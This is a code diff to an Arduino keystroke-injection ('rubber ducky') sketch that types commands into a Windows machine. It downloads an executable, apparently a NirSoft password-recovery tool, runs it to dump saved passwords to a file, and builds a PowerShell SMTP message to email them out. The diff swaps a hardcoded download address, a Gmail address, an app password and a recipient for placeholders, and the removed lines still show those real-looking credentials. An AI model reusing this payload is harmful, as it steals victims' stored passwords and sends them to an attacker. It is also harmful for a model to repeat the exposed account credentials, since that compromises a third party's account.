@@ -31,7 +31,7 @@ void setup()
   typeLine("cmd");
   typeSpecialKey("enter");
   delay(500);
-  typeLine("cd %temp% && powershell Invoke-WebRequest -Uri http://192.168.0.125:8000/a.exe -OutFile a.exe && a /stext pass.txt");
+  typeLine("cd %temp% && powershell Invoke-WebRequest -Uri {Address of nirsoft tool} -OutFile a.exe && a /stext pass.txt");
   typeSpecialKey("enter");
   delay(3000);
   typeLine("powershell");
@@ -47,16 +47,16 @@ void setup()
   typeLine("$SMTPInfo.EnableSSL = $true");
   typeSpecialKey("enter");
 
-  typeLine("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('harleyquinn1165@gmail.com', 'bvzs ndoz imsl mmpu')");
+  typeLine("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_EMAIL_ADDRESS', 'EMAIL_PASSWORD')");
   typeSpecialKey("enter");
 
   typeLine("$ReportEmail = New-Object System.Net.Mail.MailMessage");
   typeSpecialKey("enter");
 
-  typeLine("$ReportEmail.From = 'harleyquinn1165@gmail.com'");
+  typeLine("$ReportEmail.From = 'YOUR_EMAIL_ADDRESS'");
   typeSpecialKey("enter");
 
-  typeLine("$ReportEmail.To.Add('cavinkumaran1257@gmail.com')");
+  typeLine("$ReportEmail.To.Add('YOUR_EMAIL_ADDRESS')");
   typeSpecialKey("enter");
 
   typeLine("$ReportEmail.Subject = 'Passwords from Arduino Duck ; )'");
@@ -86,11 +86,7 @@ void setup()
 }
 
 void loop() 
-{ 
-  // delay(3000);
-  // typeSpecialKey("windows");
-
-}
+{}
 
 void typeLine(char* line) {
   for(int i = 0; i < strlen(line); i++) {
